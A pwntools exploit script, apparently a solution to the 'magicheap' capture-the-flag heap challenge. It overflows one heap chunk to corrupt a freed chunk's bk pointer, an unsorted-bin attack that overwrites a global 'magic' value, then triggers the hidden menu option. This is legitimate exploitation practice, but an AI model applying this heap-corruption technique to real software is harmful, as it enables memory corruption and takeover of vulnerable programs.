from pwn import *
p=process('./magicheap')
magic=0x00000000006020C0
gdb.attach(p,'''
	break *0x0000000000400C8C
	continue
''')

def create(size,content):
	p.recvuntil('Your choice :')
	p.sendline('1')
	p.recvuntil('Size of Heap : ')
	p.sendline(str(size))
	p.recvuntil('Content of heap:')
	p.sendline(str(content))

def edit(index,size,content):
	p.recvuntil('Your choice :')
	p.sendline('2')
	p.recvuntil('Index :')
	p.sendline(str(index))	
	p.recvuntil('Size of Heap : ')
	p.sendline(str(size))
	p.recvuntil('Content of heap : ')
	p.sendline(str(content))

def dele(index):
	p.recvuntil('Your choice :')
	p.sendline('3')
	p.recvuntil('Index :')
	p.sendline(str(index))

def exit():
	p.recvuntil('Your choice :')
	p.sendline('4')
	
create(0x80,'0000')
create(0x80,'1111')
create(0x80,'2222')
dele(1)
edit(0,0x100,'a'*0x80+p64(0)+p64(0x90)+p64(0)+p64(magic-0x10))
create(0x80,'3333')  # the chunk1(index 1) unlink (malloc ) from unsorted bin ,and the fake bk point to the main-arena
#create(0x80,'4444')
p.recvuntil('Your choice :')
p.sendline('4869')
print p.recv(1024)
p.interactive()
